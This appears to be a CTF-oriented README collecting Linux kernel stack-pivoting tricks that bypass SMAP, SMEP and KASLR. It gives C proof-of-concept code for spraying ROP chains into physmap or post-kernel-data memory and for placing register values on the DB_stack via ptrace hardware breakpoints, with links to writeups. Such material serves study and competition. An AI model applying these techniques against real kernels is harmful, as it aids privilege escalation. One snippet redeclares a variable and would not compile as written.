# linux-kernel-stack-pivoting-trick
some tricks for linux kernel stack pivoting in CTF \[with smap|smep|kaslr\]

## direct mapping area [physmap]
- condition: leak physmap address
- exploit: mmap\[or other ways\] to spray rop chain
```c
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char** argv, char** envp)
{
        // spray rop chain 0
        char buf[0x100000] = { 0 };
        for (int i = 0; i < 0x100000 / 0x1000; i++) {
                strcpy(buf+i*0x1000, "XiaozaYaPwner");
        }

        // spray rop chain 1
        char* buf = mmap(NULL, 0x100000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        for (int i = 0; i < 0x100000 / 0x1000; i++) {
                strcpy(buf+i*0x1000, "XiaozaYaPwner");
        }
        getchar();

        return 0;
}
```
- example: [MINI-LCTF2022 kgadget](https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x03-Kernel-ROP-ret2dir) with smap&&smep, but no kaslr

## DB_stack [in per-cpu cpu_entry_area]
- condition: leak per-cpu cpu_entry_area after linux 6.2
- exploit: trigger hardware breakpoint to place rop chain in DB_stack
```c
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/ptrace.h>
#define DB_OFFSET(idx) ((void*)(&(((struct user*)0)->u_debugreg[idx])))
pid_t pid;
int status;
char buf[4];

void set_hbp(void *addr)
{
    if (ptrace(PTRACE_POKEUSER, pid, DB_OFFSET(0), addr) == -1)
    {
        printf("Failed to set dr_0\n");
        kill(pid, 9);
        exit(-1);
    }
    unsigned long dr_7 = (1<<0)|(1<<8)|(1<<16)|(1<<17)|(1<<18)|(1<<19);
    if (ptrace(PTRACE_POKEUSER, pid, DB_OFFSET(7), dr_7) == -1)
    {
        printf("Failed to set dr_7\n");
        kill(pid, 9);
        exit(-1);
    }
}

int main(int argc, char **argv, char **env)
{
    pid = fork();
    if (!pid)
    {
        cpu_set_t cpu_set;
        CPU_ZERO(&cpu_set);
        CPU_SET(0, &cpu_set);
        sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        raise(SIGSTOP);
        // place rop chain
        __asm__(
        "mov r15,   0x11111111;"
        "mov r14,   0x22222222;"
        "mov r13,   0x33333333;"
        "mov r12,   0x44444444;"
        "mov rbp,   0x55555555;"
        "mov rbx,   0x66666666;"
        "mov r11,   0x77777777;"
        "mov r10,   0x88888888;"
        "mov r9,    0x99999999;"
        "mov r8,    0xaaaaaaaa;"
        "mov rax,   0xbbbbbbbb;"
        "mov rcx,   0xcccccccc;"
        "mov rdx,   0xdddddddd;"
        "mov rsi,   0xeeeeeeee;"
        "mov rdi,   0xffffffff;"
        );
        buf[0] = 0;
        exit(1);

    }
    waitpid(pid, &status, 0);
    set_hbp(buf);

    ptrace(PTRACE_CONT, pid, NULL, NULL);
    waitpid(pid, &status, 0);

    ptrace(PTRACE_CONT, pid, NULL, NULL);
    waitpid(pid, &status, 0);

    return 0;
}
```
- example: [SCTF2023 sycrop|moonpray](https://github.com/pray77/CVE-2023-3640)
- bypass cea randomization in qemu [maybe just in CTF]:
-  [make cpu-entry-area great again](https://kqx.io/post/sp0/) by [@kqx](https://kqx.io/about/)
-  I know the trick in [wm_easyker && wm_easynetlink writeup](https://cnitlrt.github.io/wmctf2025/#wm_easyker) by [@cnitlrt](https://cnitlrt.github.io/about/)

## a area after kernel data [maybe just in CTF]
- condition: leak kbase
- exploit: mmap\[or other ways\] to spray rop chain
```c
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char** argv, char** envp)
{
        // spray rop chain 0
        char buf[0x100000] = { 0 };
        for (int i = 0; i < 0x100000 / 0x1000; i++) {
                strcpy(buf+i*0x1000, "XiaozaYaPwner");
        }

        // spray rop chain 1
        char* buf = mmap(NULL, 0x100000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        for (int i = 0; i < 0x100000 / 0x1000; i++) {
                strcpy(buf+i*0x1000, "XiaozaYaPwner");
        }
        getchar();

        return 0;
}
```
- example: [WMCTF2025 wm_easyker](https://blog.xmcve.com/2025/09/22/WMCTF2025-Writeup/#title-5)
